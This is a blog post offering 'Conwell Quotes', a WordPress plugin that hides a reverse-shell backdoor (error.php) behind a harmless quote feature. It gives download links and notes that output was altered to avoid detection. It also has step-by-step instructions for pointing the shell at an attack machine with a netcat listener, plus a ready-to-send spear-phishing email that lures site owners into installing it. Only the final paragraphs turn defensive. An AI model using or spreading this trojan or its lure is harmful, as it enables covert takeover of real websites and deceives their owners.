---
author: kylepott
date: 2019-04-14 19:41:16+00:00
draft: false
title: Conwell Quotes - WordPress Plugin With a Backdoor
type: post
url: /2019/04/14/conwell-quotes-wordpress-plugin-with-a-backdoor/
tags:
- netcat
- open source
- PHP
- reverse-shell
- wordpress
---

![](https://technicalagain.com/wp-content/uploads/2019/04/Screenshot-from-2019-04-14-14-34-00.png)
![](https://technicalagain.com/wp-content/uploads/2019/04/Screenshot-from-2019-04-14-14-33-29.png)


Conwell Quotes is a malicious WordPress plugin that hides a reverse shell in a backdoor behind legitimate plugin functionality. This is used for offensive security purposes.

Here is a [direct download of version 1.0](https://technicalagain.com/wp-content/uploads/2019/04/conwell.zip) of the plugin that you can add to WordPress.

You can find the [open source code on GitHub](https://github.com/kylepott/Conwell-Quotes).

Modeled after the Hello Dolly plugin which comes packaged on all new WordPress installation, Conwell Quotes displays a random quote on each page of the WordPress admin portal based on Conwell's _Acres of Diamonds_ (which is one of my favorite books). It also uploads an _error.php_ backdoor that can be used to open a reverse TCP shell. The reverse shell code was mostly written by [Pen Test Monkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell). The print lines have been either commented out, suppressed, or slightly modified to avoid detection.


### Offensive Security Use


You'll want to change the port and IP address of _error.php_ to match your attack system and then upload the plugin or use in combination with the spear phishing sample below.

Upload the plugin to Wordpress, use netcat to open a listener on your attack machine, and then open /wp-content/plugins/conwell/error.php in a browser. The screen will most likely clock, but will not display an error message that tips off the reverse shell.

![](https://technicalagain.com/wp-content/uploads/2019/04/Screenshot-from-2019-04-14-14-05-55.png)



### Note


Some hosts, like Bluehost, have their WordPress accounts on non-dedicated IPs which means they have nearly all ports blocked. You may not be able to use the malicious shell in _error.php_. However, the legitimate functionality in Conwell Quotes will still work and the user will not receive any error message.

When uploading the plugin, WordPress does not have any malware detection and so the plugin will install and activate as usual. To get access to the reverse shell, the plugin does not need to be activated, it simply needs to be installed. Yet another good reason to delete out any unused WordPress plugins.


### 
Used with Spear Phishing




<blockquote>Subject: Great book.

Hello [name],

I know how much you love writing and great quotes. Check out Russell Conwell's [Acres of Diamonds](https://en.wikipedia.org/wiki/Russell_Conwell#%22Acres_of_Diamonds%22]) on Wikipedia.I think you'd love this book. In WordPress you can install the [Conwell Quotes plugin](https://technicalagain.com/wp-content/uploads/2019/04/conwell.zip) which will rotate great Conwell quotes on your WordPress dashboard--which is awesome!

Enjoy!

[name]</blockquote>




### Next Steps


Now that I have more experience writing plugins with WordPress, I think I can write a plugin that can be used to detect the presence of an unexpected reverse shell - a malware defender so to speak.

_Do this one thing._

Make sure you delete, and don't just deactivate, unused WordPress plugins.  This is a perfect example of the malicious code residing in the plugin even if it is deactivated.
